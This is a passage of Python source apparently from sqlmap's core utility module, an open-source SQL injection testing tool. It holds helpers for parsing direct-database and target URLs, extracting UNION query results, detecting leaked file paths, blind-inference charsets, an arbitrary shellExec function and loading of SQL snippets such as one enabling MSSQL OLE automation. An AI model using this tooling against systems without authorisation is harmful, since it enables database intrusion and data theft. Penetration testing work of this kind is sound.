re.search(r\"^(?P<dbms>%s)://(?P<credentials>(?P<user>.*?)\\:(?P<pass>.*)\\@)?(?P<remote>(?P<hostname>[\\w.-]+?)\\:(?P<port>[\\d]+)\\/)?(?P<db>[\\w\\d\\ \\:\\.\\_~\\-\\/\\\\]*)$\" % dbms, conf.direct, re.I)\n\n        if details:\n            conf.dbms = details.group(\"dbms\")\n\n            if details.group(\"credentials\"):\n                conf.dbmsUser = details.group(\"user\").strip(\"'\\\"\")\n                conf.dbmsPass = details.group(\"pass\").strip(\"'\\\"\")\n            else:\n                if conf.dbmsCred:\n                    conf.dbmsUser, conf.dbmsPass = conf.dbmsCred.split(':')\n                else:\n                    conf.dbmsUser = \"\"\n                    conf.dbmsPass = \"\"\n\n            if not conf.dbmsPass:\n                conf.dbmsPass = None\n\n            if details.group(\"remote\"):\n                remote = True\n                conf.hostname = details.group(\"hostname\").strip()\n                conf.port = int(details.group(\"port\"))\n            else:\n                conf.hostname = \"localhost\"\n                conf.port = 0\n\n            conf.dbmsDb = details.group(\"db\").strip() if details.group(\"db\") is not None else None\n            conf.parameters[None] = \"direct connection\"\n\n            break\n\n    if kb.smokeMode:\n        return\n\n    if not details:\n        errMsg = \"invalid target details, valid syntax is for instance \"\n        errMsg += \"'mysql://USER:PASSWORD@DBMS_IP:DBMS_PORT/DATABASE_NAME' \"\n        errMsg += \"or 'access://DATABASE_FILEPATH'\"\n        raise SqlmapSyntaxException(errMsg)\n\n    for dbmsName, data in DBMS_DICT.items():\n        if dbmsName == conf.dbms or conf.dbms.lower() in data[0]:\n            try:\n                conf.dbms = dbmsName\n\n                if dbmsName in (DBMS.ACCESS, DBMS.SQLITE, DBMS.FIREBIRD):\n                    if remote:\n                        warnMsg = \"direct connection over the network for \"\n                        warnMsg += \"%s DBMS is not supported\" % dbmsName\n                        logger.warning(warnMsg)\n\n                        conf.hostname = \"localhost\"\n                        conf.port = 0\n                elif not remote:\n                    errMsg = \"missing remote connection details (e.g. \"\n                    errMsg += \"'mysql://USER:PASSWORD@DBMS_IP:DBMS_PORT/DATABASE_NAME' \"\n                    errMsg += \"or 'access://DATABASE_FILEPATH')\"\n                    raise SqlmapSyntaxException(errMsg)\n\n                if dbmsName in (DBMS.MSSQL, DBMS.SYBASE):\n                    __import__(\"_mssql\")\n                    pymssql = __import__(\"pymssql\")\n\n                    if not hasattr(pymssql, \"__version__\") or pymssql.__version__ < \"1.0.2\":\n                        errMsg = \"'%s' third-party library must be \" % data[1]\n                        errMsg += \"version >= 1.0.2 to work properly. \"\n                        errMsg += \"Download from '%s'\" % data[2]\n                        raise SqlmapMissingDependence(errMsg)\n\n                elif dbmsName == DBMS.MYSQL:\n                    __import__(\"pymysql\")\n                elif dbmsName == DBMS.PGSQL:\n                    __import__(\"psycopg2\")\n                elif dbmsName == DBMS.ORACLE:\n                    __import__(\"cx_Oracle\")\n\n                    # Reference: http://itsiti.com/ora-28009-connection-sys-sysdba-sysoper\n                    if (conf.dbmsUser or \"\").upper() == \"SYS\":\n                        conf.direct = \"%s?mode=SYSDBA\" % conf.direct\n                elif dbmsName == DBMS.SQLITE:\n                    __import__(\"sqlite3\")\n                elif dbmsName == DBMS.ACCESS:\n                    __import__(\"pyodbc\")\n                elif dbmsName == DBMS.FIREBIRD:\n                    __import__(\"kinterbasdb\")\n            except (SqlmapSyntaxException, SqlmapMissingDependence):\n                raise\n            except:\n                if _sqlalchemy and data[3] and any(_ in _sqlalchemy.dialects.__all__ for _ in (data[3], data[3].split('+')[0])):\n                    pass\n                else:\n                    errMsg = \"sqlmap requires '%s' third-party library \" % data[1]\n                    errMsg += \"in order to directly connect to the DBMS \"\n                    errMsg += \"'%s'. You can download it from '%s'\" % (dbmsName, data[2])\n                    errMsg += \". Alternative is to use a package 'python-sqlalchemy' \"\n                    errMsg += \"with support for dialect '%s' installed\" % data[3]\n                    raise SqlmapMissingDependence(errMsg)\n\ndef parseTargetUrl():\n    \"\"\"\n    Parse target URL and set some attributes into the configuration singleton\n\n    >>> pushValue(conf.url)\n    >>> conf.url = \"https://www.test.com/?id=1\"\n    >>> parseTargetUrl()\n    >>> conf.hostname\n    'www.test.com'\n    >>> conf.scheme\n    'https'\n    >>> conf.url = popValue()\n    \"\"\"\n\n    if not conf.url:\n        return\n\n    originalUrl = conf.url\n\n    if re.search(r\"://\\[.+\\]\", conf.url) and not socket.has_ipv6:\n        errMsg = \"IPv6 communication is not supported \"\n        errMsg += \"on this platform\"\n        raise SqlmapGenericException(errMsg)\n\n    if not re.search(r\"^(http|ws)s?://\", conf.url, re.I):\n        if re.search(r\":443\\b\", conf.url):\n            conf.url = \"https://%s\" % conf.url\n        else:\n            conf.url = \"http://%s\" % conf.url\n\n    if kb.customInjectionMark in conf.url:\n        conf.url = conf.url.replace('?', URI_QUESTION_MARKER)\n\n    try:\n        urlSplit = _urllib.parse.urlsplit(conf.url)\n    except ValueError as ex:\n        errMsg = \"invalid URL '%s' has been given ('%s'). \" % (conf.url, getSafeExString(ex))\n        errMsg += \"Please be sure that you don't have any leftover characters (e.g. '[' or ']') \"\n        errMsg += \"in the hostname part\"\n        raise SqlmapGenericException(errMsg)\n\n    hostnamePort = urlSplit.netloc.split(\":\") if not re.search(r\"\\[.+\\]\", urlSplit.netloc) else filterNone((re.search(r\"\\[.+\\]\", urlSplit.netloc).group(0), re.search(r\"\\](:(?P<port>\\d+))?\", urlSplit.netloc).group(\"port\")))\n\n    conf.scheme = (urlSplit.scheme.strip().lower() or \"http\")\n    conf.path = urlSplit.path.strip()\n    conf.hostname = hostnamePort[0].strip()\n\n    if conf.forceSSL:\n        conf.scheme = re.sub(r\"(?i)\\A(http|ws)\\Z\", r\"\\g<1>s\", conf.scheme)\n\n    conf.ipv6 = conf.hostname != conf.hostname.strip(\"[]\")\n    conf.hostname = conf.hostname.strip(\"[]\").replace(kb.customInjectionMark, \"\")\n\n    try:\n        conf.hostname.encode(\"idna\")\n        conf.hostname.encode(UNICODE_ENCODING)\n    except (LookupError, UnicodeError):\n        invalid = True\n    else:\n        invalid = False\n\n    if any((invalid, re.search(r\"\\s\", conf.hostname), '..' in conf.hostname, conf.hostname.startswith('.'), '\\n' in originalUrl)):\n        errMsg = \"invalid target URL ('%s')\" % originalUrl\n        raise SqlmapSyntaxException(errMsg)\n\n    if len(hostnamePort) == 2:\n        try:\n            conf.port = int(hostnamePort[1])\n        except:\n            errMsg = \"invalid target URL\"\n            raise SqlmapSyntaxException(errMsg)\n    elif conf.scheme in (\"https\", \"wss\"):\n        conf.port = 443\n    else:\n        conf.port = 80\n\n    if conf.port < 1 or conf.port > 65535:\n        errMsg = \"invalid target URL port (%d)\" % conf.port\n        raise SqlmapSyntaxException(errMsg)\n\n    conf.url = getUnicode(\"%s://%s%s%s\" % (conf.scheme, (\"[%s]\" % conf.hostname) if conf.ipv6 else conf.hostname, (\":%d\" % conf.port) if not (conf.port == 80 and conf.scheme == \"http\" or conf.port == 443 and conf.scheme == \"https\") else \"\", conf.path))\n    conf.url = conf.url.replace(URI_QUESTION_MARKER, '?')\n\n    if urlSplit.query:\n        if '=' not in urlSplit.query:\n            conf.url = \"%s?%s\" % (conf.url, getUnicode(urlSplit.query))\n        else:\n            conf.parameters[PLACE.GET] = urldecode(urlSplit.query, spaceplus=not conf.base64Parameter) if urlSplit.query and urlencode(DEFAULT_GET_POST_DELIMITER, None) not in urlSplit.query else urlSplit.query\n\n    if (intersect(REFERER_ALIASES, conf.testParameter, True) or conf.level >= 3) and not any(_[0].upper() == HTTP_HEADER.REFERER.upper() for _ in conf.httpHeaders):\n        debugMsg = \"setting the HTTP Referer header to the target URL\"\n        logger.debug(debugMsg)\n        conf.httpHeaders = [_ for _ in conf.httpHeaders if _[0] != HTTP_HEADER.REFERER]\n        conf.httpHeaders.append((HTTP_HEADER.REFERER, conf.url.replace(kb.customInjectionMark, \"\")))\n\n    if (intersect(HOST_ALIASES, conf.testParameter, True) or conf.level >= 5) and not any(_[0].upper() == HTTP_HEADER.HOST.upper() for _ in conf.httpHeaders):\n        debugMsg = \"setting the HTTP Host header to the target URL\"\n        logger.debug(debugMsg)\n        conf.httpHeaders = [_ for _ in conf.httpHeaders if _[0] != HTTP_HEADER.HOST]\n        conf.httpHeaders.append((HTTP_HEADER.HOST, getHostHeader(conf.url)))\n\n    if conf.url != originalUrl:\n        kb.originalUrls[conf.url] = originalUrl\n\ndef escapeJsonValue(value):\n    \"\"\"\n    Escapes JSON value (used in payloads)\n\n    # Reference: https://stackoverflow.com/a/16652683\n\n    >>> \"\\\\n\" in escapeJsonValue(\"foo\\\\nbar\")\n    False\n    >>> \"\\\\\\\\t\" in escapeJsonValue(\"foo\\\\tbar\")\n    True\n    \"\"\"\n\n    retVal = \"\"\n\n    for char in value:\n        if char < ' ' or char == '\"':\n            retVal += json.dumps(char)[1:-1]\n        else:\n            retVal += char\n\n    return retVal\n\ndef expandAsteriskForColumns(expression):\n    \"\"\"\n    If the user provided an asterisk rather than the column(s)\n    name, sqlmap will retrieve the columns itself and reprocess\n    the SQL query string (expression)\n    \"\"\"\n\n    match = re.search(r\"(?i)\\ASELECT(\\s+TOP\\s+[\\d]+)?\\s+\\*\\s+FROM\\s+(([`'\\\"][^`'\\\"]+[`'\\\"]|[\\w.]+)+)(\\s|\\Z)\", expression)\n\n    if match:\n        infoMsg = \"you did not provide the fields in your query. \"\n        infoMsg += \"sqlmap will retrieve the column names itself\"\n        logger.info(infoMsg)\n\n        _ = match.group(2).replace(\"..\", '.').replace(\".dbo.\", '.')\n        db, conf.tbl = _.split('.', 1) if '.' in _ else (None, _)\n\n        if db is None:\n            if expression != conf.sqlQuery:\n                conf.db = db\n            elif conf.db:\n                expression = re.sub(r\"([^\\w])%s\" % re.escape(conf.tbl), r\"\\g<1>%s.%s\" % (conf.db, conf.tbl), expression)\n        else:\n            conf.db = db\n\n        conf.db = safeSQLIdentificatorNaming(conf.db)\n        conf.tbl = safeSQLIdentificatorNaming(conf.tbl, True)\n\n        columnsDict = conf.dbmsHandler.getColumns(onlyColNames=True)\n\n        if columnsDict and conf.db in columnsDict and conf.tbl in columnsDict[conf.db]:\n            columns = list(columnsDict[conf.db][conf.tbl].keys())\n            columns.sort()\n            columnsStr = \", \".join(column for column in columns)\n            expression = expression.replace('*', columnsStr, 1)\n\n            infoMsg = \"the query with expanded column name(s) is: \"\n            infoMsg += \"%s\" % expression\n            logger.info(infoMsg)\n\n    return expression\n\ndef getLimitRange(count, plusOne=False):\n    \"\"\"\n    Returns range of values used in limit/offset constructs\n\n    >>> [_ for _ in getLimitRange(10)]\n    [0, 1, 2, 3, 4, 5, 6, 7, 8, 9]\n    \"\"\"\n\n    retVal = None\n    count = int(count)\n    limitStart, limitStop = 1, count\n    reverse = False\n\n    if kb.dumpTable:\n        if conf.limitStart and conf.limitStop and conf.limitStart > conf.limitStop:\n            limitStop = conf.limitStart\n            limitStart = conf.limitStop\n            reverse = True\n        else:\n            if isinstance(conf.limitStop, int) and conf.limitStop > 0 and conf.limitStop < limitStop:\n                limitStop = conf.limitStop\n\n            if isinstance(conf.limitStart, int) and conf.limitStart > 0 and conf.limitStart <= limitStop:\n                limitStart = conf.limitStart\n\n    retVal = xrange(limitStart, limitStop + 1) if plusOne else xrange(limitStart - 1, limitStop)\n\n    if reverse:\n        retVal = xrange(retVal[-1], retVal[0] - 1, -1)\n\n    return retVal\n\ndef parseUnionPage(page):\n    \"\"\"\n    Returns resulting items from UNION query inside provided page content\n\n    >>> parseUnionPage(\"%sfoo%s%sbar%s\" % (kb.chars.start, kb.chars.stop, kb.chars.start, kb.chars.stop))\n    ['foo', 'bar']\n    \"\"\"\n\n    if page is None:\n        return None\n\n    if re.search(r\"(?si)\\A%s.*%s\\Z\" % (kb.chars.start, kb.chars.stop), page):\n        if len(page) > LARGE_OUTPUT_THRESHOLD:\n            warnMsg = \"large output detected. This might take a while\"\n            logger.warning(warnMsg)\n\n        data = BigArray()\n        keys = set()\n\n        for match in re.finditer(r\"%s(.*?)%s\" % (kb.chars.start, kb.chars.stop), page, re.DOTALL | re.IGNORECASE):\n            entry = match.group(1)\n\n            if kb.chars.start in entry:\n                entry = entry.split(kb.chars.start)[-1]\n\n            if kb.unionDuplicates:\n                key = entry.lower()\n                if key not in keys:\n                    keys.add(key)\n                else:\n                    continue\n\n            entry = entry.split(kb.chars.delimiter)\n\n            if conf.hexConvert:\n                entry = applyFunctionRecursively(entry, decodeDbmsHexValue)\n\n            if kb.safeCharEncode:\n                entry = applyFunctionRecursively(entry, safecharencode)\n\n            data.append(entry[0] if len(entry) == 1 else entry)\n    else:\n        data = page\n\n    if len(data) == 1 and isinstance(data[0], six.string_types):\n        data = data[0]\n\n    return data\n\ndef parseFilePaths(page):\n    \"\"\"\n    Detects (possible) absolute system paths inside the provided page content\n\n    >>> _ = \"/var/www/html/index.php\"; parseFilePaths(\"<html>Error occurred at line 207 of: %s<br>Please contact your administrator</html>\" % _); _ in kb.absFilePaths\n    True\n    \"\"\"\n\n    if page:\n        for regex in FILE_PATH_REGEXES:\n            for match in re.finditer(regex, page):\n                absFilePath = match.group(\"result\").strip()\n                page = page.replace(absFilePath, \"\")\n\n                if isWindowsDriveLetterPath(absFilePath):\n                    absFilePath = posixToNtSlashes(absFilePath)\n\n                if absFilePath not in kb.absFilePaths:\n                    kb.absFilePaths.add(absFilePath)\n\ndef getLocalIP():\n    \"\"\"\n    Get local IP address (exposed to the remote/target)\n    \"\"\"\n\n    retVal = None\n\n    try:\n        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n        s.connect((conf.hostname, conf.port))\n        retVal, _ = s.getsockname()\n        s.close()\n    except:\n        debugMsg = \"there was an error in opening socket \"\n        debugMsg += \"connection toward '%s'\" % conf.hostname\n        logger.debug(debugMsg)\n\n    return retVal\n\ndef getRemoteIP():\n    \"\"\"\n    Get remote/target IP address\n\n    >>> pushValue(conf.hostname)\n    >>> conf.hostname = \"localhost\"\n    >>> getRemoteIP() == \"127.0.0.1\"\n    True\n    >>> conf.hostname = popValue()\n    \"\"\"\n\n    retVal = None\n\n    try:\n        retVal = socket.gethostbyname(conf.hostname)\n    except socket.gaierror:\n        errMsg = \"address resolution problem \"\n        errMsg += \"occurred for hostname '%s'\" % conf.hostname\n        singleTimeLogMessage(errMsg, logging.ERROR)\n\n    return retVal\n\ndef getFileType(filePath):\n    \"\"\"\n    Returns \"magic\" file type for given file path\n\n    >>> getFileType(__file__)\n    'text'\n    >>> getFileType(sys.executable)\n    'binary'\n    \"\"\"\n\n    try:\n        desc = magic.from_file(filePath) or magic.MAGIC_UNKNOWN_FILETYPE\n    except:\n        desc = magic.MAGIC_UNKNOWN_FILETYPE\n    finally:\n        desc = getText(desc)\n\n    if desc == getText(magic.MAGIC_UNKNOWN_FILETYPE):\n        content = openFile(filePath, \"rb\", encoding=None).read()\n\n        try:\n            content.decode()\n        except:\n            pass\n        else:\n            desc = \"ascii\"\n\n    return \"text\" if any(_ in desc.lower() for _ in (\"ascii\", \"text\")) else \"binary\"\n\ndef getCharset(charsetType=None):\n    \"\"\"\n    Returns list with integers representing characters of a given\n    charset type appropriate for inference techniques\n\n    >>> getCharset(CHARSET_TYPE.BINARY)\n    [0, 1, 47, 48, 49]\n    \"\"\"\n\n    asciiTbl = []\n\n    if charsetType is None:\n        asciiTbl.extend(xrange(0, 128))\n\n    # Binary\n    elif charsetType == CHARSET_TYPE.BINARY:\n        asciiTbl.extend((0, 1))\n        asciiTbl.extend(xrange(47, 50))\n\n    # Digits\n    elif charsetType == CHARSET_TYPE.DIGITS:\n        asciiTbl.extend((0, 9))\n        asciiTbl.extend(xrange(47, 58))\n\n    # Hexadecimal\n    elif charsetType == CHARSET_TYPE.HEXADECIMAL:\n        asciiTbl.extend((0, 1))\n        asciiTbl.extend(xrange(47, 58))\n        asciiTbl.extend(xrange(64, 71))\n        asciiTbl.extend((87, 88))  # X\n        asciiTbl.extend(xrange(96, 103))\n        asciiTbl.extend((119, 120))  # x\n\n    # Characters\n    elif charsetType == CHARSET_TYPE.ALPHA:\n        asciiTbl.extend((0, 1))\n        asciiTbl.extend(xrange(64, 91))\n        asciiTbl.extend(xrange(96, 123))\n\n    # Characters and digits\n    elif charsetType == CHARSET_TYPE.ALPHANUM:\n        asciiTbl.extend((0, 1))\n        asciiTbl.extend(xrange(47, 58))\n        asciiTbl.extend(xrange(64, 91))\n        asciiTbl.extend(xrange(96, 123))\n\n    return asciiTbl\n\ndef directoryPath(filepath):\n    \"\"\"\n    Returns directory path for a given filepath\n\n    >>> directoryPath('/var/log/apache.log')\n    '/var/log'\n    >>> directoryPath('/var/log')\n    '/var/log'\n    \"\"\"\n\n    retVal = filepath\n\n    if filepath and os.path.splitext(filepath)[-1]:\n        retVal = ntpath.dirname(filepath) if isWindowsDriveLetterPath(filepath) else posixpath.dirname(filepath)\n\n    return retVal\n\ndef normalizePath(filepath):\n    \"\"\"\n    Returns normalized string representation of a given filepath\n\n    >>> normalizePath('//var///log/apache.log')\n    '/var/log/apache.log'\n    \"\"\"\n\n    retVal = filepath\n\n    if retVal:\n        retVal = retVal.strip(\"\\r\\n\")\n        retVal = ntpath.normpath(retVal) if isWindowsDriveLetterPath(retVal) else re.sub(r\"\\A/{2,}\", \"/\", posixpath.normpath(retVal))\n\n    return retVal\n\ndef safeFilepathEncode(filepath):\n    \"\"\"\n    Returns filepath in (ASCII) format acceptable for OS handling (e.g. reading)\n\n    >>> 'sqlmap' in safeFilepathEncode(paths.SQLMAP_HOME_PATH)\n    True\n    \"\"\"\n\n    retVal = filepath\n\n    if filepath and six.PY2 and isinstance(filepath, six.text_type):\n        retVal = getBytes(filepath, sys.getfilesystemencoding() or UNICODE_ENCODING)\n\n    return retVal\n\n\ndef safeExpandUser(filepath):\n    \"\"\"\n    Patch for a Python Issue18171 (http://bugs.python.org/issue18171)\n\n    >>> os.path.basename(__file__) in safeExpandUser(__file__)\n    True\n    \"\"\"\n\n    retVal = filepath\n\n    try:\n        retVal = os.path.expanduser(filepath)\n    except UnicodeError:\n        _ = locale.getdefaultlocale()\n        encoding = _[1] if _ and len(_) > 1 else UNICODE_ENCODING\n        retVal = getUnicode(os.path.expanduser(filepath.encode(encoding)), encoding=encoding)\n\n    return retVal\n\ndef safeStringFormat(format_, params):\n    \"\"\"\n    Avoids problems with inappropriate string format strings\n\n    >>> safeStringFormat('SELECT foo FROM %s LIMIT %d', ('bar', '1'))\n    'SELECT foo FROM bar LIMIT 1'\n    >>> safeStringFormat(\"SELECT foo FROM %s WHERE name LIKE '%susan%' LIMIT %d\", ('bar', '1'))\n    \"SELECT foo FROM bar WHERE name LIKE '%susan%' LIMIT 1\"\n    \"\"\"\n\n    if format_.count(PAYLOAD_DELIMITER) == 2:\n        _ = format_.split(PAYLOAD_DELIMITER)\n        _[1] = re.sub(r\"(\\A|[^A-Za-z0-9])(%d)([^A-Za-z0-9]|\\Z)\", r\"\\g<1>%s\\g<3>\", _[1])\n        retVal = PAYLOAD_DELIMITER.join(_)\n    else:\n        retVal = re.sub(r\"(\\A|[^A-Za-z0-9])(%d)([^A-Za-z0-9]|\\Z)\", r\"\\g<1>%s\\g<3>\", format_)\n\n    if isinstance(params, six.string_types):\n        retVal = retVal.replace(\"%s\", params, 1)\n    elif not isListLike(params):\n        retVal = retVal.replace(\"%s\", getUnicode(params), 1)\n    else:\n        start, end = 0, len(retVal)\n        match = re.search(r\"%s(.+)%s\" % (PAYLOAD_DELIMITER, PAYLOAD_DELIMITER), retVal)\n        if match and PAYLOAD_DELIMITER not in match.group(1):\n            start, end = match.start(), match.end()\n        if retVal.count(\"%s\", start, end) == len(params):\n            for param in params:\n                index = retVal.find(\"%s\", start)\n                if isinstance(param, six.string_types):\n                    param = param.replace('%', PARAMETER_PERCENTAGE_MARKER)\n                retVal = retVal[:index] + getUnicode(param) + retVal[index + 2:]\n        else:\n            if any('%s' in _ for _ in conf.parameters.values()):\n                parts = format_.split(' ')\n                for i in xrange(len(parts)):\n                    if PAYLOAD_DELIMITER in parts[i]:\n                        parts[i] = parts[i].replace(PAYLOAD_DELIMITER, \"\")\n                        parts[i] = \"%s%s\" % (parts[i], PAYLOAD_DELIMITER)\n                        break\n                format_ = ' '.join(parts)\n\n            count = 0\n            while True:\n                match = re.search(r\"(\\A|[^A-Za-z0-9])(%s)([^A-Za-z0-9]|\\Z)\", retVal)\n                if match:\n                    if count >= len(params):\n                        warnMsg = \"wrong number of parameters during string formatting. \"\n                        warnMsg += \"Please report by e-mail content \\\"%r | %r | %r\\\" to '%s'\" % (format_, params, retVal, DEV_EMAIL_ADDRESS)\n                        raise SqlmapValueException(warnMsg)\n                    else:\n                        try:\n                            retVal = re.sub(r\"(\\A|[^A-Za-z0-9])(%s)([^A-Za-z0-9]|\\Z)\", r\"\\g<1>%s\\g<3>\" % params[count], retVal, 1)\n                        except re.error:\n                            retVal = retVal.replace(match.group(0), match.group(0) % params[count], 1)\n                        count += 1\n                else:\n                    break\n\n    retVal = getText(retVal).replace(PARAMETER_PERCENTAGE_MARKER, '%')\n\n    return retVal\n\ndef getFilteredPageContent(page, onlyText=True, split=\" \"):\n    \"\"\"\n    Returns filtered page content without script, style and/or comments\n    or all HTML tags\n\n    >>> getFilteredPageContent(u'<html><title>foobar</title><body>test</body></html>') == \"foobar test\"\n    True\n    \"\"\"\n\n    retVal = page\n\n    # only if the page's charset has been successfully identified\n    if isinstance(page, six.text_type):\n        retVal = re.sub(r\"(?si)<script.+?</script>|<!--.+?-->|<style.+?</style>%s\" % (r\"|<[^>]+>|\\t|\\n|\\r\" if onlyText else \"\"), split, page)\n        retVal = re.sub(r\"%s{2,}\" % split, split, retVal)\n        retVal = htmlUnescape(retVal.strip().strip(split))\n\n    return retVal\n\ndef getPageWordSet(page):\n    \"\"\"\n    Returns word set used in page content\n\n    >>> sorted(getPageWordSet(u'<html><title>foobar</title><body>test</body></html>')) == [u'foobar', u'test']\n    True\n    \"\"\"\n\n    retVal = set()\n\n    # only if the page's charset has been successfully identified\n    if isinstance(page, six.string_types):\n        retVal = set(_.group(0) for _ in re.finditer(r\"\\w+\", getFilteredPageContent(page)))\n\n    return retVal\n\ndef showStaticWords(firstPage, secondPage, minLength=3):\n    \"\"\"\n    Prints words appearing in two different response pages\n\n    >>> showStaticWords(\"this is a test\", \"this is another test\")\n    ['this']\n    \"\"\"\n\n    infoMsg = \"finding static words in longest matching part of dynamic page content\"\n    logger.info(infoMsg)\n\n    firstPage = getFilteredPageContent(firstPage)\n    secondPage = getFilteredPageContent(secondPage)\n\n    infoMsg = \"static words: \"\n\n    if firstPage and secondPage:\n        match = SequenceMatcher(None, firstPage, secondPage).find_longest_match(0, len(firstPage), 0, len(secondPage))\n        commonText = firstPage[match[0]:match[0] + match[2]]\n        commonWords = getPageWordSet(commonText)\n    else:\n        commonWords = None\n\n    if commonWords:\n        commonWords = [_ for _ in commonWords if len(_) >= minLength]\n        commonWords.sort(key=functools.cmp_to_key(lambda a, b: cmp(a.lower(), b.lower())))\n\n        for word in commonWords:\n            infoMsg += \"'%s', \" % word\n\n        infoMsg = infoMsg.rstrip(\", \")\n    else:\n        infoMsg += \"None\"\n\n    logger.info(infoMsg)\n\n    return commonWords\n\ndef isWindowsDriveLetterPath(filepath):\n    \"\"\"\n    Returns True if given filepath starts with a Windows drive letter\n\n    >>> isWindowsDriveLetterPath('C:\\\\boot.ini')\n    True\n    >>> isWindowsDriveLetterPath('/var/log/apache.log')\n    False\n    \"\"\"\n\n    return re.search(r\"\\A[\\w]\\:\", filepath) is not None\n\ndef posixToNtSlashes(filepath):\n    \"\"\"\n    Replaces all occurrences of Posix slashes in provided\n    filepath with NT backslashes\n\n    >>> posixToNtSlashes('C:/Windows')\n    'C:\\\\\\\\Windows'\n    \"\"\"\n\n    return filepath.replace('/', '\\\\') if filepath else filepath\n\ndef ntToPosixSlashes(filepath):\n    \"\"\"\n    Replaces all occurrences of NT backslashes in provided\n    filepath with Posix slashes\n\n    >>> ntToPosixSlashes(r'C:\\\\Windows')\n    'C:/Windows'\n    \"\"\"\n\n    return filepath.replace('\\\\', '/') if filepath else filepath\n\ndef isHexEncodedString(subject):\n    \"\"\"\n    Checks if the provided string is hex encoded\n\n    >>> isHexEncodedString('DEADBEEF')\n    True\n    >>> isHexEncodedString('test')\n    False\n    \"\"\"\n\n    return re.match(r\"\\A[0-9a-fA-Fx]+\\Z\", subject) is not None\n\n@cachedmethod\ndef getConsoleWidth(default=80):\n    \"\"\"\n    Returns console width\n\n    >>> any((getConsoleWidth(), True))\n    True\n    \"\"\"\n\n    width = None\n\n    if os.getenv(\"COLUMNS\", \"\").isdigit():\n        width = int(os.getenv(\"COLUMNS\"))\n    else:\n        try:\n            output = shellExec(\"stty size\")\n            match = re.search(r\"\\A\\d+ (\\d+)\", output)\n\n            if match:\n                width = int(match.group(1))\n        except (OSError, MemoryError):\n            pass\n\n    if width is None:\n        try:\n            import curses\n\n            stdscr = curses.initscr()\n            _, width = stdscr.getmaxyx()\n            curses.endwin()\n        except:\n            pass\n\n    return width or default\n\ndef shellExec(cmd):\n    \"\"\"\n    Executes arbitrary shell command\n\n    >>> shellExec('echo 1').strip() == '1'\n    True\n    \"\"\"\n\n    retVal = \"\"\n\n    try:\n        retVal = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT).communicate()[0] or \"\"\n    except Exception as ex:\n        retVal = getSafeExString(ex)\n    finally:\n        retVal = getText(retVal)\n\n    return retVal\n\ndef clearConsoleLine(forceOutput=False):\n    \"\"\"\n    Clears current console line\n    \"\"\"\n\n    if IS_TTY:\n        dataToStdout(\"\\r%s\\r\" % (\" \" * (getConsoleWidth() - 1)), forceOutput)\n\n    kb.prependFlag = False\n\ndef parseXmlFile(xmlFile, handler):\n    \"\"\"\n    Parses XML file by a given handler\n    \"\"\"\n\n    try:\n        with contextlib.closing(io.StringIO(readCachedFileContent(xmlFile))) as stream:\n            parse(stream, handler)\n    except (SAXParseException, UnicodeError) as ex:\n        errMsg = \"something appears to be wrong with \"\n        errMsg += \"the file '%s' ('%s'). Please make \" % (xmlFile, getSafeExString(ex))\n        errMsg += \"sure that you haven't made any changes to it\"\n        raise SqlmapInstallationException(errMsg)\n\ndef getSQLSnippet(dbms, sfile, **variables):\n    \"\"\"\n    Returns content of SQL snippet located inside 'procs/' directory\n\n    >>> 'RECONFIGURE' in getSQLSnippet(DBMS.MSSQL, \"activate_sp_oacreate\")\n    True\n    \"\"\"\n\n    if sfile.endswith('.sql') and os.path.exists(sfile):\n        filename = sfile\n    elif not sfile.endswith('.sql') and os.path.exists(\"%s.sql\" % sfile):\n        filename = \"%s.sql\" % sfile\n    else:\n        filename = os.path.join(paths.SQLMAP_PROCS_PATH, DBMS_DIRECTORY_DICT[dbms], sfile if sfile.endswith('.sql') else \"%s.sql\" % sfile)\n        checkFile(filename)\n\n    retVal = readCachedFileContent(filename)\n    retVal = re.sub(r\"#.+\", \"\", retVal)\n    retVal = re.sub(r\";\\s+\", \"; \", retVal).strip(\"\\r\\n\")\n\n    for _ in variables:\n        retVal = re.sub(r\"%%%s%%\" % _, variables[_].replace('\\\\', r'\\\\'), retVal)\n\n    for _ in re.findall(r\"%RANDSTR\\d+%\", retVal, re.I):\n        retVal = retVal.replace(_, randomStr())\n\n    for _ in re.findall(r\"%RANDINT\\d+%\", retVal, re.I):\n        retVal = retVal.replace(_, randomInt())\n\n    variables = re.findall(r\"(?<!\\bLIKE ')%(\\w+)%\", retVal, re.I)\n\n    if variables:\n        errMsg = \"unresolved variable%s '%s' in SQL file '%s'\" % (\"s\" if len(variables) > 1 else \"\", \", \".join(variables), sfile)\n        logger.error(errMsg)\n\n        msg = \"do you want to provide the substitution values? [y/N] \"\n\n        if readInput(msg, default='N', boolean=True):\n            for var in variables:\n                msg = \"insert value for variable '%s': \" % var\n                val = readInput(msg, default=\"\")\n                retVal = retVal.replace(r\"%%%s%%\" % var, val)\n\n    return retVal\n\ndef readCachedFileContent(filename, mode=\"rb\"):\n    \"\"\"\n    Cached reading of file content (avoiding multiple same file reading)\n\n    >>> \"readCachedFileContent\" in readCachedFileContent(__file__)\n    True\n    \"\"\"\n\n    if filename not in kb.cache.content:\n        with kb.locks.cache:\n            if filename not in kb.cache.content:\n                checkFile(filename)\n                try:\n                    with openFile(filename, mode) as f:\n                        kb.cache.content[filename] = f.read()\n                except (IOError, OSError, MemoryError) as ex:\n                    errMsg = \"something went wrong while trying \"\n                    errMsg += \"to read the content of file '%s' ('%s')\" % (filename, getSafeExString(ex))\n                    raise SqlmapSystemException(errMsg)\n\n    return kb.cache.content[filename]\n\ndef average(values):\n    \"\"\"\n    Computes the arithmetic mean of a list of numbers.\n\n    >>> \"%.1f\" % average([0.9, 0.9, 0.9, 1.0, 0.8, 0.9])\n    '0.9'\n    \"\"\"\n\n    return (1.0 * sum(values) / len(values)) if values else None\n\n@cachedmethod\ndef stdev(values):\n    \"\"\"\n    Computes standard deviation of a list of numbers.\n\n    # Reference: http://www.goldb.org/corestats.html\n\n    >>> \"%.3f\" % stdev([0.9, 0.9, 0.9, 1.0, 0.8, 0.9])\n    '0.063'\n    \"\"\"\n\n    if not values or len(values) < 2:\n        return None\n    else:\n        avg = average(values)\n        _ = 1.0 * sum(pow((_ or 0) - avg, 2) for _ in values)\n        return sqrt(_ / (len(values) - 1))\n\ndef calculateDeltaSeconds(start):\n    \"\"\"\n    Returns elapsed time from start till now\n\n    >>> calculateDeltaSeconds(0) > 1151721660\n    True\n    \"\"\"\n\n    return time.time() - start\n\ndef initCommonOutputs():\n    \"\"\"\n    Initializes dictionary containing common output values used by \"good samaritan\" feature\n\n    >>> initCommonOutputs(); 